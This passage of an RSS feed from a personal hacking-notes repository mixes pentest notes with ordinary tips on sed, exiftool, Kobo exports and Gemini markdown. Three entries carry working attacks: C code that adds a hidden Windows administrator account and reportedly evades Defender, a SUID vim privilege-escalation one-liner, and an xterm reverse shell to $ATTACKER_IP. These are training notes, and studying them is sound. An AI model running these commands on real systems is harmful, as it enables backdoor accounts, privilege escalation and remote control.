&lt;code&gt;PASSWORD&lt;/code&gt; obviously need to be updated to fit the current use case.)&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode c&quot;&gt;&lt;code class=&quot;sourceCode c&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;pp&quot;&gt;#include &amp;lt;stdlib.h&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; main() {&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; i;&lt;/span&gt;
&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    i = system(&lt;span class=&quot;st&quot;&gt;&amp;quot;net user USERNAME PASSWORD /add&amp;quot;&lt;/span&gt;);&lt;/span&gt;
&lt;span id=&quot;cb1-7&quot;&gt;&lt;a href=&quot;#cb1-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    i = system(&lt;span class=&quot;st&quot;&gt;&amp;quot;net localgroup administrators USERNAME /add&amp;quot;&lt;/span&gt;);&lt;/span&gt;
&lt;span id=&quot;cb1-8&quot;&gt;&lt;a href=&quot;#cb1-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-9&quot;&gt;&lt;a href=&quot;#cb1-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;cf&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;
&lt;span id=&quot;cb1-10&quot;&gt;&lt;a href=&quot;#cb1-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As of August 17, 2022, binaries compiled from this code are &lt;em&gt;not&lt;/em&gt; detected as malicious by Windows Defender.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.offensive-security.com/offsec/offsec-live/&quot;&gt;OffSec Live&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 12 Apr 2023 02:58:39 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20Unquoted%20Paths.md</guid>
		</item>
		<item>
			<title>Exploiting ViM</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20ViM.md</link>
			<description>&lt;p&gt;If ViM is SUID root &lt;em&gt;and&lt;/em&gt; is compiled with Python support, it can be used for privilege escalation.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;vim&lt;/span&gt; -c &lt;span class=&quot;st&quot;&gt;&amp;#39;:py3 import os; os.execl(&amp;quot;/bin/sh&amp;quot;, &amp;quot;sh&amp;quot;, &amp;quot;-pc&amp;quot;, &amp;quot;reset; exec sh -p&amp;quot;)&amp;#39;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; Use &lt;code&gt;:py&lt;/code&gt; instead if only Python 2 is available.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/basicpentestingjt&quot;&gt;TryHackMe: Basic Pentesting&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://gtfobins.github.io/gtfobins/vim/&quot;&gt;GTFOBins: vim&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 12 Apr 2023 02:58:39 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20ViM.md</guid>
		</item>
		<item>
			<title>Exploiting Xterm</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20Xterm.md</link>
			<description>&lt;p&gt;Remember that the X11 protocol is network based! You can thus get xterm to act as a reverse shell by simply providing it with a display pointing to your machine.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;xterm&lt;/span&gt; -display &lt;span class=&quot;va&quot;&gt;$ATTACKER_IP&lt;/span&gt;:&lt;span class=&quot;va&quot;&gt;$DISPLAY_NUM&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The connection will be made back on port 6000 + &lt;code&gt;$DISPLAY_NUM&lt;/code&gt; (so, 6000 for display 0, 6001 for display 1, etc.).&lt;/p&gt;&lt;p&gt;This, of course, requires a running X server on your end (for example, &lt;code&gt;Xnest :1&lt;/code&gt;). You'll need to make sure that connections from the target system are authrized.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;xhost&lt;/span&gt; +&lt;span class=&quot;va&quot;&gt;$TARGET_IP&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/slyth11907/Cheatsheets&quot;&gt;slyth11907 / Cheatsheets&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 12 Apr 2023 02:58:39 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20Xterm.md</guid>
		</item>
		<item>
			<title>Export Highlights and Annotations from Kobo eReaders</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Export%20Highlights%20and%20Annotations%20from%20Kobo%20eReaders.md</link>
			<description>&lt;p&gt;Open up &lt;code&gt;D:\.kobo\Kobo\Kobo eReader.conf&lt;/code&gt; (where &lt;code&gt;D:&lt;/code&gt; is the Kobo's mount point) and add (or modify) the following block:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode ini&quot;&gt;&lt;code class=&quot;sourceCode ini&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;[FeatureSettings]&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;dt&quot;&gt;ExportHighlights&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;true&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This should add a new menu option for a given book (accessible in My Books) allowing highlights and annotations to be extracted to the root of the Kobo mount.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://web.archive.org/web/20200405061523/https%3A%2F%2Fmedium.com%2F%40angeldan1989%2Fhow-to-export-notes-highlights-annotations-from-kobo-ereaders-20606b7159b6&quot;&gt;How to Export Highlights/Annotations from Kobo eReaders&lt;/a&gt;.&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 12 Apr 2023 02:58:39 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Export%20Highlights%20and%20Annotations%20from%20Kobo%20eReaders.md</guid>
		</item>
		<item>
			<title>Extract the Webpage Title of a URL</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Extract%20the%20Webpage%20Title%20of%20a%20URL.md</link>
			<description>&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;python3&lt;/span&gt; -c &lt;span class=&quot;st&quot;&gt;&amp;quot;import bs4, requests; print(bs4.BeautifulSoup(requests.get(&amp;#39;&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$URL&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;#39;).text).title.text)&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This needs the &lt;code&gt;python3-bs4&lt;/code&gt; package on Debian-based distribution. Note that we use the &lt;code&gt;.text&lt;/code&gt; method instead of &lt;code&gt;.content&lt;/code&gt; to ensure that we get back a unicode string (rather than just the raw bytes, which can and will get mangled by anything you pipe this into).&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; This won't work on webpages for sites like Twitter that set the &lt;code&gt;&amp;lt;title/&amp;gt;&lt;/code&gt; using JavaScript after initial page load.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://unix.stackexchange.com/a/563920&quot;&gt;How do I get a websites title using command line?&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://stackoverflow.com/a/12843406&quot;&gt;Python Requests and Unicode&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://docs.python-requests.org/en/latest/api/#requests.Response&quot;&gt;Requests Developer Interface: class requests.Response&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 12 Apr 2023 02:58:39 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Extract%20the%20Webpage%20Title%20of%20a%20URL.md</guid>
		</item>
		<item>
			<title>Find and Replace a Single Line in a Large Text File</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Find%20and%20Replace%20a%20Single%20Line%20in%20a%20Large%20Text%20File.md</link>
			<description>&lt;p&gt;To display a single line from a large text file:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sed&lt;/span&gt; -n &lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;${LINE_NUMBER}&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;{p;q}&amp;quot;&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$FILE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;p&lt;/code&gt; command prints matching lines, and the &lt;code&gt;q&lt;/code&gt; command causes sed to quit after the first match.&lt;/p&gt;&lt;p&gt;You can't use &lt;code&gt;q&lt;/code&gt; if you want to print a block of lines, so you'll just need to &lt;code&gt;^C&lt;/code&gt; after the output is printed so that sed doesn't keep needlessly reading the file.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sed&lt;/span&gt; -n &lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;${START_LINE}&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;${END_LINE}&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;p&amp;quot;&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$FILE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If you want to replace a single line, you can use a similar trick (once you've identified the line number):&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sed&lt;/span&gt; -i &lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;${LINE_NUMBER}&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;s/.*/&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;${REPLACEMENT_TEXT}&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;/&amp;quot;&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$FILE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It may be advisable to use single quote here, rather than double quotes + variable substitution, to prevent shell weirdness. Unfortunately, there's really no way to tell when this command has finished (except to let it work through the whole file).&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;http://stackoverflow.com/a/2796347&quot;&gt;Getting one line in a huge file with bash&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://stackoverflow.com/a/11145362&quot;&gt;How to replace an entire line in a text file by line number&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 12 Apr 2023 02:58:39 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Find%20and%20Replace%20a%20Single%20Line%20in%20a%20Large%20Text%20File.md</guid>
		</item>
		<item>
			<title>Fix EXIF Data on Google Photos Exports</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Fix%20EXIF%20Data%20on%20Google%20Photos%20Exports.md</link>
			<description>&lt;p&gt;Google Photos doesn't save date/time changes, descriptions, or GPS data set in-app to the photos' EXIF data. Instead, when using Google Takeout this information is exported as JSON sidecar files (apparently Google had to bikeshed something rather than just using XMP).&lt;/p&gt;&lt;p&gt;Fortunately, ExifTool can merge the data from these files back into the exported photographs:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;exiftool&lt;/span&gt; -r -d %s &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;         &lt;span class=&quot;ex&quot;&gt;-tagsfromfile&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;%d/%F.json&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                       &lt;span class=&quot;st&quot;&gt;&amp;quot;-GPSAltitude&amp;lt;GeoDataAltitude&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                       &lt;span class=&quot;st&quot;&gt;&amp;quot;-GPSLatitude&amp;lt;GeoDataLatitude&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                       &lt;span class=&quot;st&quot;&gt;&amp;quot;-GPSLatitudeRef&amp;lt;GeoDataLatitude&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                       &lt;span class=&quot;st&quot;&gt;&amp;quot;-GPSLongitude&amp;lt;GeoDataLongitude&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-7&quot;&gt;&lt;a href=&quot;#cb1-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                       &lt;span class=&quot;st&quot;&gt;&amp;quot;-GPSLongitudeRef&amp;lt;GeoDataLongitude&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-8&quot;&gt;&lt;a href=&quot;#cb1-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                       &lt;span class=&quot;st&quot;&gt;&amp;quot;-Keywords&amp;lt;Tags&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-9&quot;&gt;&lt;a href=&quot;#cb1-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                       &lt;span class=&quot;st&quot;&gt;&amp;quot;-Subject&amp;lt;Tags&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-10&quot;&gt;&lt;a href=&quot;#cb1-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                       &lt;span class=&quot;st&quot;&gt;&amp;quot;-Caption-Abstract&amp;lt;Description&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-11&quot;&gt;&lt;a href=&quot;#cb1-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                       &lt;span class=&quot;st&quot;&gt;&amp;quot;-ImageDescription&amp;lt;Description&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-12&quot;&gt;&lt;a href=&quot;#cb1-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                       &lt;span class=&quot;st&quot;&gt;&amp;quot;-DateTimeOriginal&amp;lt;PhotoTakenTimeTimestamp&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-13&quot;&gt;&lt;a href=&quot;#cb1-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;         &lt;span class=&quot;ex&quot;&gt;-ext&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;*&amp;quot;&lt;/span&gt; -overwrite_original -progress &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-14&quot;&gt;&lt;a href=&quot;#cb1-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;         &lt;span class=&quot;ex&quot;&gt;--ext&lt;/span&gt; json &lt;span class=&quot;va&quot;&gt;$GOOGLE_PHOTOS_DIR&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Note that this will fail for any photos with a timestamp before 1970; for these photos, replace &lt;code&gt;&quot;-DateTimeOriginal&amp;lt;PhotoTakenTimeTimestamp&quot;&lt;/code&gt; with &lt;code&gt;&quot;-DateTimeOriginal&amp;lt;PhotoTakenTimeFormatted&quot; -d &quot;%b %d, %Y, %I:%M:%S %p UTC&quot;&lt;/code&gt;.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://legault.me/post/correctly-migrate-away-from-google-photos-to-icloud&quot;&gt;How To Correctly Export And Migrate Away From Google Photos&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://exiftool.org/forum/index.php?topic=10636.0&quot;&gt;ExifTool Dies on One Specific Photo&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://takeout.google.com/settings/takeout&quot;&gt;Google Takeout&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Extensible_Metadata_Platform&quot;&gt;Extensible Metadata Platform (Wikipedia)&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://exiftool.org/&quot;&gt;ExifTool&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 12 Apr 2023 02:58:39 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Fix%20EXIF%20Data%20on%20Google%20Photos%20Exports.md</guid>
		</item>
		<item>
			<title>Gemini Compatible Markdown</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Gemini%20Compatible%20Markdown.md</link>
			<description>&lt;p&gt;Gemini uses a syntax that is &lt;em&gt;almost&lt;/em&gt; a subset of CommonMark.&lt;/p&gt;&lt;p&gt;Be aware that Gemini treats all line breaks literally and clients are expected to wrap text. Line breaks are also rendered literally. So, one paragraph = one line!&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;gemini://gemini.circumlunar.space/docs/specification.gmi&quot;&gt;Project Gemini Speculative Specification&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://spec.commonmark.org/current/&quot;&gt;CommonMark Spec&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;allowed-formatting-elements&quot;&gt;Allowed Formatting Elements&lt;/h2&gt;&lt;p&gt;The trick with Gemini formatting is to remember that the protocol is &lt;em&gt;line&lt;/em&gt; oriented, so all formatting (including linking) is applied to the entire block. Inline formatting isn't supported, but can be used to the extent that raw markdown is easily readable.&lt;/p&gt;&lt;h3 id=&quot;headings&quot;&gt;Headings&lt;/h3&gt;&lt;p&gt;Gemini allows H1 - H3 (&lt;code&gt;#&lt;/code&gt; - &lt;code&gt;###&lt;/code&gt;) headings.&lt;/p&gt;&lt;p&gt;Unlike HTML, Gemini &lt;em&gt;specifically allows&lt;/em&gt; multiple H1 tags, as headings are treated purely as an outlining tool. This should probably be avoided in cases where a document might be rendered in both HTML and Gemini, as semantic HTML expects only a single H1 per content block.&lt;/p&gt;&lt;p&gt;In some cases, the first H1 tag in Gemini is treated as the page header (if it is not preceded by any other text with the exception of empty lines) and the following H2 is treated as a sub header (again, if there is no other intervening text except for blank lines).&lt;/p&gt;&lt;h3 id=&quot;strongemphasis--inline-code&quot;&gt;Strong/Emphasis &amp;amp; Inline Code&lt;/h3&gt;&lt;p&gt;Gemini doesn't explicitly support any formatting tags &lt;em&gt;within&lt;/em&gt; a line. However, the convention of using single stars (&lt;code&gt;*&lt;/code&gt;) to denote emphasis and back-ticks (`) to quote code is well established and can be used even in a &quot;plain text&quot; line without looking weird.&lt;/p&gt;&lt;p&gt;Instead of using two stars (&lt;code&gt;**&lt;/code&gt;) to denote bolded text, it's probably better to use UPPER CASE for documents destined for Gemini.&lt;/p&gt;&lt;p&gt;Since Markdown requires that these characters be escaped, so text destined for Gemini will need to be processed to remove back-slashed escapes (&lt;code&gt;\&lt;/code&gt;). Note that md2gmi can handle this automatically.&lt;/p&gt;&lt;p&gt;That said, when writing with Gemini in mind it's probably best to take a minimalist approach to inline formatting. Use when required to clarify, but otherwise let your words speak for themselves!&lt;/p&gt;&lt;h3 id=&quot;lists&quot;&gt;Lists&lt;/h3&gt;&lt;p&gt;Only &lt;em&gt;unordered&lt;/em&gt; lists are permitted in Gemini, and no indentation is allowed. Lists &lt;em&gt;must&lt;/em&gt; use star characters (&lt;code&gt;*&lt;/code&gt;) as their leaders.&lt;/p&gt;&lt;h3 id=&quot;quotes&quot;&gt;Quotes&lt;/h3&gt;&lt;p&gt;Quote blocks cannot be nested in Gemini, and all interior formatting is preserved as-is. This means that in practice, quote blocks also can't contain lists, code blocks, etc.&lt;/p&gt;&lt;h3 id=&quot;code-blocks&quot;&gt;&quot;Code&quot; Blocks&lt;/h3&gt;&lt;p&gt;Gemini allows code blocks. In Gemini the code block type (normally something like &lt;code&gt;bash&lt;/code&gt; or &lt;code&gt;html&lt;/code&gt; in Markdown) is used by clients as &quot;alt text&quot;. Unfortunately, many Markdown processors (including Jekyll) don't handle arbitrary strings in the code block type gracefully, so we need to stick with Markdown's conventions here.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://jekyllrb.com/&quot;&gt;Jekyll&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;tables&quot;&gt;Tables&lt;/h3&gt;&lt;p&gt;The md2gmn utility handles tables by converting them into code blocks, which works for my purposes.&lt;/p&gt;&lt;h2 id=&quot;links--images&quot;&gt;Links &amp;amp; Images&lt;/h2&gt;&lt;p&gt;Gemini doesn't support Markdown links or images, though tools like md2gmn can handle the conversion into Gemini's format.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;=&amp;gt;[&amp;lt;whitespace&amp;gt;]&amp;lt;URL&amp;gt;[&amp;lt;whitespace&amp;gt;&amp;lt;USER-FRIENDLY LINK NAME&amp;gt;]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I've yet to run into a Markdown-to-Gemini converter that handles inline links in a completely sensible way. That said, md2gmn does a good job &lt;em&gt;if and only if&lt;/em&gt; links are presented as unordered lists or on singleton lines. Note that when using this convention, &lt;em&gt;no&lt;/em&gt; non-link characters (except perhaps for the leading &lt;code&gt;* &lt;/code&gt; in unordered lists) may be used. This means that presenting links in unordered lists is probably the best option.&lt;/p&gt;&lt;p&gt;As an example, suppose we have the following markdown:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode markdown&quot;&gt;&lt;code class=&quot;sourceCode markdown&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;This is a sentence.&lt;/span&gt;
&lt;span id=&quot;cb2-2&quot;&gt;&lt;a href=&quot;#cb2-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-3&quot;&gt;&lt;a href=&quot;#cb2-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ss&quot;&gt;* &lt;/span&gt;&lt;span class=&quot;co&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;necopinus.xyz&lt;/span&gt;&lt;span class=&quot;co&quot;&gt;](https://necopinus.xyz)&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-4&quot;&gt;&lt;a href=&quot;#cb2-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ss&quot;&gt;* &lt;/span&gt;&lt;span class=&quot;co&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;Cardboard Iguana Security&lt;/span&gt;&lt;span class=&quot;co&quot;&gt;](https://cardboard-iguana.com)&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-5&quot;&gt;&lt;a href=&quot;#cb2-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
